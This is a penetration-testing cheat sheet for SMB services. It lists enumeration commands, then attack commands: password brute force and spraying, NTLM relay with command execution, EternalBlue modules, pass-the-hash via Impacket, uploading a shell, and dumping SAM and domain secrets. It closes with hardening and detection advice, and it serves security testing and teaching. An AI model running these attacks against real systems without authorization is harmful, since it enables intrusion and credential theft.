# SMB Enumeration and Exploitation Reference

## Introduction

Server Message Block (SMB) is a network communication protocol used for sharing files, printers, and other resources between devices on a network. SMB is commonly found in Windows environments and is a critical target during penetration testing due to its potential for information disclosure, credential harvesting, and lateral movement.

This comprehensive guide covers SMB enumeration techniques, common vulnerabilities, exploitation methods, and post-exploitation activities. SMB services typically run on ports 139 (NetBIOS) and 445 (SMB over TCP).

## SMB vs Samba - Key Differences

### Protocol vs Implementation

| Term | Type | Description |
|------|------|-------------|
| `SMB` | Protocol | Server Message Block - the actual network protocol specification |
| `Samba` | Implementation | Open-source implementation of SMB protocol for Unix/Linux systems |
| `CIFS` | Legacy Name | Common Internet File System - older name for SMB |

### Platform Usage

| Platform | Implementation | Description |
|----------|---------------|-------------|
| `Windows` | Native SMB | Built-in Windows SMB server/client |
| `Linux/Unix` | Samba | Third-party implementation of SMB protocol |
| `macOS` | SMB Client | Native SMB client, can connect to both |

### Key Points

| Aspect | Details |
|--------|---------|
| `Protocol Standard` | SMB is the protocol specification (like HTTP) |
| `Samba Implementation` | Samba implements SMB protocol on non-Windows systems |
| `Compatibility` | Samba servers appear as Windows SMB servers to clients |
| `Pentesting` | Same enumeration techniques work on both Windows SMB and Linux Samba |
| `Vulnerabilities` | Different vulnerabilities may exist in Windows SMB vs Samba |

### Enumeration - Same Techniques for Both

**Why Enumeration is Identical:**
- Both use the same SMB protocol specification
- Both listen on ports 139/445
- Both respond to the same SMB commands and requests
- Client tools can't tell the difference during enumeration

### Universal Enumeration Commands

| Command | Works On | Notes |
|---------|----------|-------|
| `nmap --script smb-enum-shares 10.10.10.40` | ✅ Windows SMB<br>✅ Linux Samba | Protocol-level enumeration |
| `smbclient -L //10.10.10.40 -N` | ✅ Windows SMB<br>✅ Linux Samba | Standard SMB list shares |
| `enum4linux -a 10.10.10.40 | tee enum4linux.log` | ✅ Windows SMB<br>✅ Linux Samba | Works with both implementations |
| `rpcclient -U "" -N 10.10.10.40` | ✅ Windows SMB<br>✅ Linux Samba | RPC calls work on both |
| `smbmap -H 10.10.10.40` | ✅ Windows SMB<br>✅ Linux Samba | Share mapping identical |
| `crackmapexec smb 10.10.10.40` | ✅ Windows SMB<br>✅ Linux Samba | Modern tool works with both |

### How to Identify the Implementation

| Method | Windows SMB Response | Linux Samba Response |
|--------|---------------------|---------------------|
| `nmap -sV -p445 target` | `Microsoft Windows` | `Samba smbd` |
| `smbclient -L //target` | `Windows Server 2019` | `Samba 4.x.x` |
| `enum4linux target` | `Windows NT/2000/XP` | `Unix (Samba x.x.x)` |
| `Banner grabbing` | Shows Windows version | Shows Samba version |

### Practical Example - Same Commands, Different Targets

```bash
# Against Windows SMB server
enum4linux 10.10.10.100
# Output: [+] Got OS info for 10.10.10.100 from smbclient: Windows Server 2019

# Against Linux Samba server  
enum4linux 10.10.10.200
# Output: [+] Got OS info for 10.10.10.200 from smbclient: Unix (Samba 4.13.17)

# Same enumeration commands work for both!
```

## SMB Protocol Basics

### Port Information

| Port | Service | Description |
|------|---------|-------------|
| `139` | NetBIOS-SSN | NetBIOS Session Service |
| `445` | Microsoft-DS | SMB over TCP (Direct SMB) |
| `137` | NetBIOS-NS | NetBIOS Name Service |
| `138` | NetBIOS-DGM | NetBIOS Datagram Service |

### SMB Versions

| Version | Description | Security Notes |
|---------|-------------|----------------|
| `SMBv1` | Legacy protocol | Vulnerable, should be disabled |
| `SMBv2` | Windows Vista/2008+ | More secure than v1 |
| `SMBv3` | Windows 8/2012+ | Most secure, encrypted |

## Basic SMB Enumeration

### Nmap SMB Scripts

| Command | Description |
|---------|-------------|
| `nmap -p 445 --script smb-os-discovery 10.10.10.40` | OS discovery via SMB |
| `nmap -p 445 --script smb-enum-shares 10.10.10.40` | Enumerate SMB shares |
| `nmap -p 445 --script smb-enum-users 10.10.10.40` | Enumerate SMB users |
| `nmap -p 445 --script smb-enum-domains 10.10.10.40` | Enumerate SMB domains |
| `nmap -p 445 --script smb-enum-groups 10.10.10.40` | Enumerate SMB groups |
| `nmap -p 445 --script smb-enum-processes 10.10.10.40` | Enumerate running processes |
| `nmap -p 445 --script smb-enum-sessions 10.10.10.40` | Enumerate active sessions |
| `nmap -p 445 --script smb-server-stats 10.10.10.40` | Get server statistics |

### SMB Vulnerability Scanning

| Command | Description |
|---------|-------------|
| `nmap -p 445 --script smb-vuln-* 10.10.10.40` | All SMB vulnerability scripts |
| `nmap -p 445 --script smb-vuln-ms17-010 10.10.10.40` | EternalBlue vulnerability |
| `nmap -p 445 --script smb-vuln-ms08-067 10.10.10.40` | MS08-067 vulnerability |
| `nmap -p 445 --script smb-vuln-ms06-025 10.10.10.40` | MS06-025 vulnerability |
| `nmap -p 445 --script smb-vuln-cve2009-3103 10.10.10.40` | CVE-2009-3103 vulnerability |
| `nmap -p 445 --script smb-vuln-webexec 10.10.10.40` | WebExec vulnerability |

## SMB Client Tools

### smbclient - Interactive SMB Client

| Command | Description |
|---------|-------------|
| `smbclient -L //10.10.10.40` | List available shares |
| `smbclient -L //10.10.10.40 -N` | List shares without password |
| `smbclient //10.10.10.40/sharename` | Connect to specific share |
| `smbclient //10.10.10.40/sharename -U username` | Connect with username |
| `smbclient //10.10.10.40/sharename -U username%password` | Connect with credentials |
| `smbclient //10.10.10.40/IPC$ -N` | Connect to IPC$ share |
| `smbclient //10.10.10.40/C$ -U administrator` | Connect to C$ admin share |

### smbclient Interactive Commands

| Command | Description |
|---------|-------------|
| `ls` | List files in current directory |
| `cd directory` | Change directory |
| `get filename` | Download file |
| `put filename` | Upload file |
| `mget *.txt` | Download multiple files |
| `mput *.txt` | Upload multiple files |
| `del filename` | Delete file |
| `mkdir dirname` | Create directory |
| `rmdir dirname` | Remove directory |
| `exit` | Exit smbclient |

### smbmap - SMB Share Enumeration

| Command | Description |
|---------|-------------|
| `smbmap -H 10.10.10.40` | Basic share enumeration |
| `smbmap -H 10.10.10.40 -u username` | Enumerate with username |
| `smbmap -H 10.10.10.40 -u username -p password` | Enumerate with credentials |
| `smbmap -H 10.10.10.40 -u null -p ""` | Null session enumeration |
| `smbmap -H 10.10.10.40 -u guest` | Guest account enumeration |
| `smbmap -H 10.10.10.40 -r` | Recursive listing |
| `smbmap -H 10.10.10.40 -R` | Recursive listing (all shares) |
| `smbmap -H 10.10.10.40 -s sharename` | Enumerate specific share |

### crackmapexec (CME) - SMB

| Command | Description |
|---------|-------------|
| `crackmapexec smb 10.10.10.40` | Basic SMB enumeration |
| `crackmapexec smb 10.10.10.0/24` | Subnet enumeration |
| `crackmapexec smb 10.10.10.40 -u username -p password` | Authenticate and enumerate |
| `crackmapexec smb 10.10.10.40 -u users.txt -p passwords.txt` | Credential spraying |
| `crackmapexec smb 10.10.10.40 -u username -H ntlmhash` | Pass-the-hash |
| `crackmapexec smb 10.10.10.40 --shares` | Enumerate shares |
| `crackmapexec smb 10.10.10.40 --users` | Enumerate users |
| `crackmapexec smb 10.10.10.40 --groups` | Enumerate groups |

## Advanced SMB Enumeration

### enum4linux - Comprehensive Enumeration

| Command | Description |
|---------|-------------|
| `enum4linux 10.10.10.40` | Full enumeration |
| `enum4linux -a 10.10.10.40` | All enumeration options |
| `enum4linux -U 10.10.10.40` | User enumeration |
| `enum4linux -S 10.10.10.40` | Share enumeration |
| `enum4linux -G 10.10.10.40` | Group enumeration |
| `enum4linux -P 10.10.10.40` | Password policy enumeration |
| `enum4linux -o 10.10.10.40` | OS information |
| `enum4linux -n 10.10.10.40` | Nmblookup |

### rpcclient - RPC Client

| Command | Description |
|---------|-------------|
| `rpcclient -U "" -N 10.10.10.40` | Connect with null session |
| `rpcclient -U username 10.10.10.40` | Connect with username |

#### rpcclient Interactive Commands

| Command | Description |
|---------|-------------|
| `enumdomusers` | Enumerate domain users |
| `enumdomgroups` | Enumerate domain groups |
| `enumalsgroups domain` | Enumerate alias groups |
| `lookupnames username` | Lookup user information |
| `queryuser 0x1f4` | Query user by RID |
| `querygroup 0x200` | Query group by RID |
| `querydominfo` | Query domain information |
| `getdompwinfo` | Get domain password information |
| `createdomuser username` | Create domain user |
| `deletedomuser username` | Delete domain user |

### SMB Share Analysis

| Command | Description |
|---------|-------------|
| `smbclient //10.10.10.40/sharename -c "recurse;ls"` | Recursive directory listing |
| `smbget -R smb://10.10.10.40/sharename/` | Download entire share |
| `smbget smb://10.10.10.40/sharename/file.txt` | Download specific file |
| `findsmb` | Find SMB servers on network |
| `nmblookup -A 10.10.10.40` | NetBIOS name lookup |

## SMB Authentication Attacks

### Password Attacks

| Command | Description |
|---------|-------------|
| `hydra -l username -P passwords.txt smb://10.10.10.40` | SMB password brute force |
| `medusa -h 10.10.10.40 -u username -P passwords.txt -M smbnt` | Medusa SMB brute force |
| `ncrack -vv --user username -P passwords.txt 10.10.10.40:445` | Ncrack SMB brute force |

### SMB Relay Attacks

| Command | Description |
|---------|-------------|
| `responder -I eth0 -rdw` | Run Responder for credential capture |
| `ntlmrelayx.py -tf targets.txt -smb2support` | SMB relay attack |
| `ntlmrelayx.py -t 10.10.10.40 -c "whoami"` | SMB relay with command execution |

## SMB Exploitation

### EternalBlue (MS17-010)

| Command | Description |
|---------|-------------|
| `use exploit/windows/smb/ms17_010_eternalblue` | Metasploit EternalBlue |
| `use exploit/windows/smb/ms17_010_psexec` | EternalBlue PSExec |
| `python eternalblue_exploit.py 10.10.10.40` | Manual EternalBlue exploit |

### PSExec and Similar

| Command | Description |
|---------|-------------|
| `psexec.py domain/username:password@10.10.10.40` | Impacket PSExec |
| `smbexec.py domain/username:password@10.10.10.40` | Impacket SMBExec |
| `wmiexec.py domain/username:password@10.10.10.40` | Impacket WMIExec |
| `dcomexec.py domain/username:password@10.10.10.40` | Impacket DCOMExec |

### Pass-the-Hash Attacks

| Command | Description |
|---------|-------------|
| `psexec.py -hashes :ntlmhash username@10.10.10.40` | PSExec with NTLM hash |
| `smbexec.py -hashes :ntlmhash username@10.10.10.40` | SMBExec with NTLM hash |
| `wmiexec.py -hashes :ntlmhash username@10.10.10.40` | WMIExec with NTLM hash |

## SMB Post-Exploitation

### File Operations

| Command | Description |
|---------|-------------|
| `smbclient //10.10.10.40/C$ -U administrator -c "get flag.txt"` | Download specific file |
| `smbclient //10.10.10.40/C$ -U administrator -c "put shell.exe"` | Upload file |
| `smbclient //10.10.10.40/C$ -U administrator -c "ls Users\"` | List user directories |

### Registry Access

| Command | Description |
|---------|-------------|
| `reg.py domain/username:password@10.10.10.40 query -keyName HKLM\\SOFTWARE` | Query registry remotely |
| `reg.py domain/username:password@10.10.10.40 save -keyName HKLM\\SAM` | Save registry hive |

### Secretsdump

| Command | Description |
|---------|-------------|
| `secretsdump.py domain/username:password@10.10.10.40` | Extract secrets |
| `secretsdump.py -hashes :ntlmhash username@10.10.10.40` | Extract with hash |
| `secretsdump.py -just-dc domain/username:password@10.10.10.40` | Extract DC secrets only |

## SMB Security Assessment

### Share Permissions Analysis

| Permission | Description |
|------------|-------------|
| `READ` | Read files and directories |
| `WRITE` | Create and modify files |
| `FULL` | Full control over share |
| `NO ACCESS` | No access to share |

### Common Dangerous Shares

| Share | Risk Level | Description |
|-------|------------|-------------|
| `C$` | Critical | Full C: drive access |
| `ADMIN$` | Critical | Windows directory access |
| `IPC$` | Medium | Inter-process communication |
| `SYSVOL` | High | Domain controller policies |
| `NETLOGON` | High | Domain logon scripts |

### SMB Security Checklist

| Check | Command/Method |
|-------|----------------|
| `Anonymous access` | `smbclient -L //target -N` |
| `Guest access` | `smbclient -L //target -U guest` |
| `Null sessions` | `rpcclient -U "" -N target` |
| `SMBv1 enabled` | `nmap --script smb-protocols target` |
| `Signing disabled` | `nmap --script smb-security-mode target` |
| `Weak passwords` | `hydra -L users.txt -P pass.txt smb://target` |

## SMB Hardening Recommendations

### Security Best Practices

| Practice | Description |
|----------|-------------|
| `Disable SMBv1` | Remove legacy SMB protocol |
| `Enable SMB signing` | Prevent relay attacks |
| `Restrict anonymous access` | Disable null sessions |
| `Use strong passwords` | Implement password policies |
| `Limit administrative shares` | Restrict C$, ADMIN$ access |
| `Network segmentation` | Isolate SMB traffic |
| `Monitor SMB logs` | Detect suspicious activity |

### Registry Settings

| Setting | Registry Path | Value |
|---------|---------------|-------|
| `Disable SMBv1` | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters` | `SMB1=0` |
| `Enable SMB signing` | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters` | `RequireSecuritySignature=1` |
| `Restrict anonymous` | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` | `RestrictAnonymous=1` |

## SMB Monitoring and Detection

### Log Analysis

| Log Source | Location | Key Events |
|------------|----------|------------|
| `Windows Security` | `Event Viewer` | 4624, 4625, 4648 |
| `SMB Server` | `System Log` | SMB connection events |
| `Network Traffic` | `Wireshark/tcpdump` | Port 445, 139 traffic |

### Detection Indicators

| Indicator | Description |
|-----------|-------------|
| `Multiple failed logins` | Password spraying attempts |
| `Unusual share access` | Potential lateral movement |
| `Large data transfers` | Data exfiltration |
| `Admin share access` | Privilege escalation |
| `Off-hours activity` | Suspicious timing |

This comprehensive SMB reference guide provides essential techniques for enumeration, exploitation, and security assessment of SMB services during penetration testing engagements.